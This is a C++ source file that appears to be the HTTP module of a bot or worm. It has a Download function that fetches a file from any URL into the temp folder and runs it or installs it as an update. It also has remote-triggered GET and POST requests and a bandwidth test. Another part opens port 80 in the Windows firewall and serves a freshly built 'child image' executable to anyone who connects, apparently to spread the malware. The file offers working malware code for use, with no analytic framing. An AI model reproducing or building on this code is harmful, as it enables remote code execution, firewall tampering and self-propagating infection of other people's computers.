#include <winsock2.h>
#include "http.h"

namespace HTTP{

VOID DownloadToFile(PCHAR URL, PCHAR FileName, BOOL Method, PCHAR PostVars){
	PCHAR URLa = new CHAR[strlen(URL) + 1];
	strcpy(URLa, URL);
	PCHAR Host;
	PCHAR File;
	ParseURL(URLa, &Host, &File);
	BOOL Chunked = FALSE;
	BOOL NextItemIsChunkSize = FALSE;
	BOOL FirstChunk = TRUE;
	
	Socket Socket;
	Socket.Create(SOCK_STREAM);
	if(Socket.Connect(Host, 80) != SOCKET_ERROR){
		CHAR PostString[1024];
		PostString[0] = NULL;
		if(Method == Methods::Post && PostVars){
			sprintf(PostString, "Content-Length: %d\r\nContent-Type: application/x-www-form-urlencoded\r\n", strlen(PostVars));
		}
		Socket.Sendf("%s /%s HTTP/1.1\r\n"
					"Host: %s\r\n"
					"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\r\n"
					"%s\r\n%s",
					Method == Methods::Get ? "GET" : "POST",
					strlen(File) ? File : "",
					Host,
					(Method == Methods::Post ? PostString : ""),
					(Method == Methods::Post && PostVars ? PostVars : "")
					);
		ReceiveBuffer RecvBuf;
		RecvBuf.Create(1024);
		UINT BytesRead = 0;
		UINT FileSize = 0;
		::File OutputFile;
		while(RecvBuf.Read(Socket) > 0){
			start:
			if(!RecvBuf.InRLMode()){
				while(RecvBuf.PopItem("\r\n", 2)){
					if(NextItemIsChunkSize){
						LONG ChunkSize = strtol(RecvBuf.PoppedItem, NULL, 16);
						if(ChunkSize == 0){
							#ifdef _DEBUG
							dprintf("** HTTP Download complete (%s)\r\n", FileName);
							#endif
							Socket.Disconnect(CLOSE_BOTH_HDL);
							break;
						}
						NextItemIsChunkSize = FALSE;
						RecvBuf.StartRL(ChunkSize);
						if(FirstChunk){
							OutputFile.Open(FileName, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, OPEN_ALWAYS, FILE_ATTRIBUTE_TEMPORARY);
							OutputFile.SetEOF();
							FirstChunk = FALSE;
						}
						break;
					}else
					if(Chunked && strlen(RecvBuf.PoppedItem) == 0){
						NextItemIsChunkSize = TRUE;
					}else
					if(FileSize && strlen(RecvBuf.PoppedItem) == 0){
						RecvBuf.StartRL(FileSize);
						OutputFile.Open(FileName, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, OPEN_ALWAYS, FILE_ATTRIBUTE_TEMPORARY);
						OutputFile.SetEOF();
						break;
					}else{
						PCHAR Temp = strtok(RecvBuf.PoppedItem, ":");
						if(Temp)
							if(stricmp(Temp, "Content-Length") == 0){
								PCHAR Size = strtok(NULL, ":");
								if(Size)
									FileSize = atoi(Size);
							}else
							if(stricmp(Temp, "Transfer-Encoding") == 0){
								PCHAR Encoding = strtok(NULL, ":");
								if(Encoding){
									if(strstr(Encoding, "chunked")){
										Chunked = TRUE;
										#ifdef _DEBUG
										dprintf("Encoding is chunked\r\n");
										#endif
									}
								}
							}
					}
				}
			}
			if(RecvBuf.InRLMode()){
				BOOL Done = RecvBuf.PopRLBuffer();
				INT RLBufferSize = RecvBuf.GetRLBufferSize();
				BytesRead += RLBufferSize;
				DWORD BytesWritten;
				OutputFile.Write((PBYTE)RecvBuf.PoppedItem, RLBufferSize, &BytesWritten);
				#ifdef _DEBUG
				dprintf("%d\\%d - %d  %d\r\n", BytesRead, FileSize, RLBufferSize, RecvBuf.GetBytesRead());
				#endif
				if(Done){
					if(Chunked){
						#ifdef _DEBUG
						dprintf("Done with chunk\r\n");
						#endif
						goto start;
					}else{
						#ifdef _DEBUG
						dprintf("** HTTP Download complete (%s)\r\n", FileName);
						#endif
						Socket.Disconnect(CLOSE_BOTH_HDL);
						break;
					}
				}
			}
		}
		RecvBuf.Cleanup();
	}
	Socket.Disconnect(CLOSE_BOTH_HDL);
	delete[] URLa;
}

VOID ParseURL(PCHAR URL, PCHAR *Host, PCHAR *File){
	UINT Offset = 0;
	*Host = URL;
	if(strncmp(URL, "http://", 7) == 0){
		*Host = URL + 7;
		Offset += 7;
	}
	*Host = strtok(*Host, "/");
	Offset += (UINT)strlen(*Host);
	*File = URL + Offset + 1;
}

VOID Download(PCHAR URL, PCHAR FileName, DWORD Flags){
	CHAR FileName2[256];
	strcpy(FileName2, FileName);
	if(stricmp(FileName, "TEMP") == 0){
		CHAR TempPath[MAX_PATH];
		CHAR TempFileName[MAX_PATH];
		GetTempPath(sizeof(TempPath), TempPath);
		GetTempFileName(TempPath, NULL, NULL, TempFileName);
		strcpy(FileName2, TempFileName);
	}
	DownloadToFile(URL, FileName2, Methods::Get, NULL);
	if(Flags == Flags::Execute){
		STARTUPINFO si;
		si.cb = sizeof(si);
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		ZeroMemory(&pi, sizeof(pi));
		CreateProcess(NULL, FileName2, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	}else
	if(Flags == Flags::Update){
		Update(FileName2);
	}
}

VOID Visit(PCHAR URL, BOOL LoadImages){
	CHAR TempPath[MAX_PATH];
	GetTempPath(MAX_PATH, TempPath);
	CHAR FileName[MAX_PATH];
	GetTempFileName(TempPath, NULL, NULL, FileName);
	DownloadToFile(URL, FileName, Methods::Get, NULL);
	if(LoadImages){
		// todo
	}
	DeleteFile(FileName);
}

VOID Post(PCHAR URL, PCHAR PostData){
	CHAR TempPath[MAX_PATH];
	GetTempPath(MAX_PATH, TempPath);
	CHAR FileName[MAX_PATH];
	GetTempFileName(TempPath, NULL, NULL, FileName);
	DownloadToFile(URL, FileName, Methods::Post, PostData);
	DeleteFile(FileName);
}

FLOAT SpeedTest(PCHAR URL){
	CHAR URLa[256];
	strcpy(URLa, URL);
	PCHAR Host;
	PCHAR File;
	ParseURL(URLa, &Host, &File);
	
	Socket Socket;
	Socket.Create(SOCK_STREAM);
	if(Socket.Connect(Host, 80) != SOCKET_ERROR){
		const UINT Bytes = 300 * 1024;
		UINT BytesSent = 0;
		DWORD StartTime = GetTickCount();
		Socket.Sendf("POST / HTTP/1.0\r\n"
					"Host: %s\r\n"
					"Content-Length: %d\r\n"
					"\r\n",
					Host, Bytes);
		CHAR Buffer[1024];
		while(BytesSent < Bytes){
			BytesSent += Socket.Send(Buffer, sizeof(Buffer));
		}
		DWORD EndTime = GetTickCount();
		Socket.Disconnect(CLOSE_BOTH_HDL);
		return ((FLOAT)Bytes / 1024) / ((EndTime - StartTime) / (FLOAT)1000);
	}
	Socket.Disconnect(CLOSE_BOTH_HDL);
	return -1;
}

HostChildImage::HostChildImage(PCHAR FileName){
	strncpy(HostChildImage::FileName, FileName, sizeof(HostChildImage::FileName));
	ListeningSocket.Create(SOCK_STREAM);
	StartThread();
}

HostChildImage::~HostChildImage(){
	ListeningSocket.Disconnect(CLOSE_BOTH_HDL);
}

VOID HostChildImage::ThreadFunc(VOID){
	FireWall FireWall;
	FireWall.OpenPort(80, NET_FW_IP_PROTOCOL_TCP, L"null");
	if(ListeningSocket.Bind(80) == SOCKET_ERROR){
		return;
	}else{
		if(ListeningSocket.Listen(4) == SOCKET_ERROR){
			return;
		}else{
			ListeningSocket.EventSelect(FD_ACCEPT);
			HANDLE Event = ListeningSocket.GetEventHandle();
			while(WSAWaitForMultipleEvents(1, &Event, FALSE, INFINITE, FALSE) != WSA_WAIT_TIMEOUT){
				WSANETWORKEVENTS NetEvents;
				ListeningSocket.EnumEvents(&NetEvents);
				Socket NewSocket;
				ListeningSocket.Accept(NewSocket);
				NewSocket.EventSelect(FD_READ | FD_CLOSE);
				HTTPQueueList.Add(NewSocket)->SetHostChildImage(this);
			}
		}
	}
}

BOOL HostChildImage::HTTPQueue::OnEvent(WSANETWORKEVENTS NetEvents){
	if(NetEvents.lNetworkEvents == FD_READ){
		while(RecvBufList[SignalledEvent].Read(SocketList[SignalledEvent]) > 0){
			while(RecvBufList[SignalledEvent].PopItem("\r\n", 2)){
				if(!RecvBufList[SignalledEvent].PoppedItem[0]){
					if(HostChildImage->ChildImage.Expired())
						HostChildImage->ChildImage.Create();
					SocketList[SignalledEvent].Sendf("HTTP/1.1 200 OK\r\nContent-Length: %d\r\nContent-Type: application/octet-stream\r\nContent-Disposition: filename=%s\r\n\r\n", HostChildImage->ChildImage.GetSize(), HostChildImage->FileName);
					SocketList[SignalledEvent].Send((PCHAR)HostChildImage->ChildImage.GetBuffer(), HostChildImage->ChildImage.GetSize());
					SocketList[SignalledEvent].Shutdown();
				}
			}
		}
	}
	return TRUE;
}

}